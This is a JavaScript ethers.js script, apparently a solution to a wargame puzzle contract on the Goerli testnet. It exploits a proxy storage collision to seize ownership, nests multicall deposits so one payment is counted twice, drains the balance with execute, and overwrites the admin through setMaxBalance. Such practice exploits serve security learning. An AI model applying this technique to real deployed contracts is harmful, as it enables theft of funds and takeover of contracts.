import { t } from '@mikro-orm/core';
import { ethers } from 'ethers';
require('dotenv').config();
const provider = new ethers.providers.InfuraProvider(5, process.env.INFURA_ID);
const wallet = new ethers.Wallet('', provider);
const add = '0x156888A898AD235DaDe390b202Cd508d66476424';
const impl = '0xAe01Aa4A94600351226c3bBea9d99A0a12361310';
const proxy = '0x37C948f821ce15f9118255B87A3090A73c50B84F';
const data =
  ethers.utils
    .keccak256(ethers.utils.toUtf8Bytes('proposeNewAdmin(address)'))
    .slice(0, 10) +
  '0'.repeat(24) +
  wallet.address.slice(2);
console.log(data);
const call = async () => {
  const txn = await wallet.sendTransaction({
    to: proxy,
    data,
    gasLimit: 100000,
  });
  console.log(txn);
};
// call();

const check = async () => {
  const res = await provider.getStorageAt(impl, 1);
  console.log(res);
};

// check();

const addToWhiteList = async () => {
  const d =
    ethers.utils
      .keccak256(ethers.utils.toUtf8Bytes('addToWhitelist(address)'))
      .slice(0, 10) +
    '0'.repeat(24) +
    wallet.address.slice(2);
  const txn = await wallet.sendTransaction({
    to: proxy,
    data: d,
    gasLimit: 100000,
  });
  console.log(txn);
};

// addToWhiteList();

const multimulticall = async () => {
  const depData = ethers.utils
    .keccak256(ethers.utils.toUtf8Bytes('deposit()'))
    .slice(0, 10);
  const mc0Data =
    ethers.utils
      .keccak256(ethers.utils.toUtf8Bytes('multicall(bytes[])'))
      .slice(0, 10) +
    ethers.utils.defaultAbiCoder.encode(['bytes[]'], [[depData]]).slice(2);
  const mc1Data =
    ethers.utils
      .keccak256(ethers.utils.toUtf8Bytes('multicall(bytes[])'))
      .slice(0, 10) +
    ethers.utils.defaultAbiCoder
      .encode(['bytes[]'], [[depData, mc0Data]])
      .slice(2);
  console.log(mc1Data);
  const txn = await wallet.sendTransaction({
    to: proxy,
    data: mc1Data,
    gasLimit: 500000,
    value: ethers.utils.parseEther('0.001'),
  });
  console.log(txn);
  const rct = await txn.wait();
  console.log(rct);
};

// multimulticall();

const execute = async () => {
  const execData =
    ethers.utils
      .keccak256(ethers.utils.toUtf8Bytes('execute(address,uint256,bytes)'))
      .slice(0, 10) +
    ethers.utils.defaultAbiCoder
      .encode(
        ['address', 'uint256', 'bytes'],
        [wallet.address, ethers.utils.parseEther('0.002'), '0x'],
      )
      .slice(2);
  const txn = await wallet.sendTransaction({
    to: proxy,
    data: execData,
    gasLimit: 100000,
  });
  console.log(txn);
  const rct = await txn.wait();
  console.log(rct);
};
// execute();

const setMax = async () => {
  const setMaxData =
    ethers.utils
      .keccak256(ethers.utils.toUtf8Bytes('setMaxBalance(uint256)'))
      .slice(0, 10) +
    ethers.utils.defaultAbiCoder.encode(['uint256'], [wallet.address]).slice(2);

  console.log(setMaxData);
  const txn = await wallet.sendTransaction({
    to: proxy,
    data: setMaxData,
    gasLimit: 100000,
  });
  console.log(txn);
  const rct = await txn.wait();
  console.log(rct);
};

setMax();
